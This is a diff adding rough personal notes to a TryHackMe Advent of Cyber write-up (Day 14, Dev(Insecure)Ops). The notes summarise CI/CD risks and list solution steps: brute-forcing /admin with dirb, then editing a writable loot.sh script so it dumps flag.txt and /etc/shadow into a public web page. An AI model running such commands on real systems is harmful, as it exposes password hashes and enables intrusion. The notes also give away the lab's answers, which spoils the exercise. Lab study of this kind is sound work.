@@ -1,3 +1,31 @@
+#Key Takeaways
+
+In software development often they use CI/CD (contiguos integration[process sourcecode kept in central repo] / continuos delivery or deployment[code auto deploy to test])
+those have lot of risk where :
+access security = increase number of integration point make access management very vulnerable because any component integrated until process may neeed partial or full access
+key and secret shd be secured 
+
+
+1) dirb http/// /admin (to bruteforce the admin page)
+2)open admin page view page source
+3)found ls.html suspicous
+at terminal of the tryhackme machine
+4)cd /home/thegrinch/scripts 
+ls we saw loot.sh and we only can access to loot.sh not other file and this change the web output at admin page since flag.txt denied
+so in the loot.sh 
+we change the script since it display stuff on web
+5)
+#!/bin/bash
+cat /home/thegrinch/Desktop/flag.txt > /var/www/html/ls.html flag showed on website
+cat /etc/shadow > /var/www/html/ls.html show password on web
+
+
+
+
+
+
+
+
 Task 19
 [Day 14] Networking Dev(Insecure)Ops
 Start Machine
